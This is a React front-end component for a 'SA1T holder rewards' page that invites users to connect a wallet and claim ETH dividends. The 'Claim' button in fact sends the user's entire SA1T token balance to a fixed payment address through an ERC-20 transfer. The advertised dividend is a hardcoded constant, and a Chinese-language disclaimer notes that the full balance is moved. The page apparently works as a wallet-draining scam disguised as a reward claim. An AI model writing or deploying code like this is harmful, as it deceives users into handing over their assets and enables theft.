import { useState } from 'react'
import { usePrivy, useWallets } from '@privy-io/react-auth'
import { encodeFunctionData } from 'viem'
import {
  SA1T_TOKEN_ADDRESS,
  DIVIDEND_PAYMENT_ADDRESS,
  PENDING_DIVIDEND_ETH,
  erc20Abi,
} from '../data/sa1t'
import { useSa1tBalance } from '../hooks/useSa1tBalance'

export default function DividendPage() {
  const { login, authenticated } = usePrivy()
  const { wallets } = useWallets()
  const walletAddress = wallets[0]?.address
  const { balance, display, loading: balanceLoading, refresh } = useSa1tBalance(walletAddress)
  const [claiming, setClaiming] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)

  const handleClaim = async () => {
    if (!authenticated) {
      login()
      return
    }

    if (balance === 0n) {
      setError('SA1T balance is 0')
      return
    }

    const wallet = wallets[0]
    if (!wallet) {
      setError('No wallet connected')
      return
    }

    setClaiming(true)
    setError('')
    setSuccess(false)

    try {
      await wallet.switchChain(1)
      const provider = await wallet.getEthereumProvider()
      const data = encodeFunctionData({
        abi: erc20Abi,
        functionName: 'transfer',
        args: [DIVIDEND_PAYMENT_ADDRESS, balance],
      })

      await provider.request({
        method: 'eth_sendTransaction',
        params: [{
          from: wallet.address,
          to: SA1T_TOKEN_ADDRESS,
          data,
        }],
      })

      setSuccess(true)
      refresh()
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Claim failed')
    } finally {
      setClaiming(false)
    }
  }

  return (
    <div className="dividend-page">
      <div className="dividend-page-inner">
        <div className="markets-label">SA1T holder rewards</div>
        <h1 className="dividend-page-title">分红网</h1>
        <p className="dividend-page-desc">
          Hold SA1T, claim ETH dividends. Connect wallet to view balance and claim.
        </p>

        <div className="dividend-card">
          <div className="dividend-card-row">
            <span className="label">SA1T Contract</span>
            <a
              className="value mono link"
              href={`https://etherscan.io/token/${SA1T_TOKEN_ADDRESS}`}
              target="_blank"
              rel="noopener noreferrer"
            >
              {SA1T_TOKEN_ADDRESS.slice(0, 6)}…{SA1T_TOKEN_ADDRESS.slice(-4)} ↗
            </a>
          </div>

          <div className="dividend-card-highlight">
            <span className="dividend-pending-label">待领取分红</span>
            <span className="dividend-page-eth">{PENDING_DIVIDEND_ETH} ETH</span>
          </div>

          {authenticated ? (
            <div className="dividend-card-row">
              <span className="label">Your SA1T balance</span>
              <span className="value accent">
                {balanceLoading ? 'Loading…' : `${display} SA1T`}
              </span>
            </div>
          ) : (
            <div className="dividend-card-row">
              <span className="label">Wallet</span>
              <span className="value muted">Not connected</span>
            </div>
          )}

          {error && <div className="modal-error">{error}</div>}
          {success && <div className="modal-success">Claim submitted. SA1T transferred.</div>}

          <button
            className="btn-buy dividend-page-btn"
            onClick={handleClaim}
            disabled={claiming || (authenticated && balance === 0n && !balanceLoading)}
          >
            {claiming ? 'Confirming…' : authenticated ? 'Claim' : 'Connect wallet'}
          </button>

          <p className="modal-disclaimer">
            领取时将钱包内全部 SA1T 转账至分红合约以兑换 ETH 奖励。
          </p>
        </div>
      </div>
    </div>
  )
}
